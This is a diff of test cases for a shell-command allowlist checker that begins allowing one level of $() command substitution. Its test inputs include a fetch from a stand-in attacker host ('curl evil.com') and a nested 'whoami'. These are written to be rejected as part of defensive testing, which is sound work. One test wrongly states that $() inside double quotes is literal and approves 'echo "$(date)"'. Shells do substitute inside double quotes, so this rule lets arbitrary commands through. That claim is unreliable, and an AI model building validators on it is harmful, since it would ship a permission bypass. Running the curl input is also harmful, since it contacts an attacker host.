@@ -332,19 +332,61 @@ TEST_CASES = [
     ),
 
     # -------------------------------------------------------------------------
-    # Dangerous constructs - always rejected
+    # Command substitution: recursive checking ($() only, 1 level deep)
     # -------------------------------------------------------------------------
+    (
+        ["rm:*", "find:*"],
+        "rm $(find . -name '*.tmp')",
+        True,
+        "$() approved when both outer and inner commands match patterns",
+    ),
     (
         ["rm:*"],
         "rm $(find . -name '*.tmp')",
         False,
-        "Command substitution $() is rejected even with matching pattern",
+        "$() rejected when inner command has no matching pattern",
+    ),
+    (
+        ["git diff:*", "git merge-base:*"],
+        "git diff $(git merge-base HEAD main)..HEAD",
+        True,
+        "$() with git merge-base inside git diff",
+    ),
+    (
+        ["echo:*"],
+        "echo $(echo $(whoami))",
+        False,
+        "Nested $() substitution rejected (>1 level deep)",
+    ),
+    (
+        ["echo:*"],
+        'echo "$(date)"',
+        True,
+        "$() inside double quotes is literal — no substitution detected",
     ),
     (
         ["rm:*"],
         "rm `find . -name '*.tmp'`",
         False,
-        "Backtick substitution is rejected even with matching pattern",
+        "Backtick substitution always rejected (use $() syntax)",
+    ),
+    (
+        ["git diff:*", "git merge-base:*", "grep:*"],
+        "git diff $(git merge-base HEAD main)..HEAD | grep foo",
+        True,
+        "Pipe with $() substitution — all parts approved",
+    ),
+    (
+        ["echo:*", "git log:*", "git status:*"],
+        "echo $(git log --oneline && git status)",
+        True,
+        "$() with chained inner command — all inner segments approved",
+    ),
+    (
+        ["echo:*"],
+        "echo $(curl evil.com)",
+        False,
+        "$() rejected when inner command (curl) not in patterns",
     ),
 
     # -------------------------------------------------------------------------
